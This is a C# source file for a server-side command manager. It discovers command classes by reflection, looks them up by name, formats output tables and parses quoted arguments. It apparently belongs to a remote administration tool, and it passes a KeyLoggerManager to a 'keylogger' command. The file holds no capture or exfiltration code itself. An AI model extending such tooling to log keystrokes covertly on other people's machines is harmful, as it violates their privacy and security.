using KeyLogger;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace ServerCommands
{
    public class ServerCommandsManager
    {
        /// <summary>
        /// List of all command classes
        /// </summary>
        public List<ICommand> commandList;

        internal static NetworkManager networkManager { get; set; }


        /// <summary>
        /// Constructor, fill commandList with the classes implementing the ICommand interface
        /// </summary>
        public ServerCommandsManager(NetworkManager networkManager)
        {
            var type = typeof(ICommand);

            commandList = AppDomain.CurrentDomain.GetAssemblies()
                .SelectMany(a => a.GetTypes())
                .Where(t => type.IsAssignableFrom(t) && !t.IsInterface)
                .Select(t => (ICommand)Activator.CreateInstance(t))
                .ToList();

            ServerCommandsManager.networkManager = networkManager;
        }


        /// <summary>   
        /// Return the ICommand whose name was given as a parameter, or null if it doesn't exist
        /// </summary>
        /// <param name="commandName">ICommand name to find</param>
        /// <returns>Found ICommand or null</returns>
        public ICommand GetCommandByName(string commandName) => SearchCommand(s => s.name == commandName);


        /// <summary>
        /// Search a command in the commandList matching the given predicate
        /// </summary>
        /// <param name="predicate">Predicate to use to find the command</param>
        /// <returns>Found ICommand or null</returns>
        public ICommand SearchCommand(Func<ICommand, bool> predicate)
        {
            ICommand foundCommand;
            try
            {
                foundCommand = commandList.First(predicate);
            }
            catch (Exception)
            {
                foundCommand = null;
            }

            return foundCommand;
        }


        /// <summary>
        /// Find the ICommand keylogger in the commandList and give it the KeyLoggerManager instance
        /// This method should only be called by the MainWindow
        /// </summary>
        /// <param name="manager">KeyLoggerManager instance</param>
        public void PassKeyloggerManagerInstance(KeyLoggerManager manager)
        {
            var keyloggerCommandInstance = (KeyLogger)commandList.Find(x => x.name == "keylogger");
            keyloggerCommandInstance.GetKeyLoggerManagerInstance(manager);
        }


        /// <summary>
        /// Produce a string displaying a table from a list of Tuple(string, string)
        /// </summary>
        /// <param name="data">List of tuple to process</param>
        /// <returns>Table as a string</returns>
        internal static string TableDisplay(IReadOnlyCollection<Tuple<string, string>> data)
        {
            var result = "";
            var longestPrefix = data.Select(t => t.Item1.Length).Max();
            var longestValue = data.Select(t => t.Item2.Length).Max();
            var horizontalDelimiter = $"+{new string('-', longestPrefix + 2)}+{new string('-', longestValue + 2)}+";

            result += horizontalDelimiter + "\n";
            foreach (var tuple in data)
            {
                var spaces = new string(' ', longestPrefix - tuple.Item1.Length);
                result += $"| {tuple.Item1}{spaces} |";

                spaces = new string(' ', longestValue - tuple.Item2.Length);
                result += $" {tuple.Item2}{spaces} |\n";
            }
            result += horizontalDelimiter;

            return result;
        }


        /// <summary>
        /// Split the given string by using the space delimiter, this takes into account double quotes (ex : for file paths)
        /// </summary>
        /// <param name="commandString">String to process</param>
        /// <returns>List of string</returns>
        public List<string> GetSplittedCommand(string commandString)
        {
            return Regex.Matches(commandString, @"[\""].+?[\""]|[^ ]+")
                .Cast<Match>()
                .Where(m => m.Value != "\"")
                .Select(m => m.Value[0] == '\"' && m.Value[m.Length - 1] == '\"' ? m.Value.Substring(1, m.Value.Length - 2) : m.Value)
                .ToList();
        }
    }
}
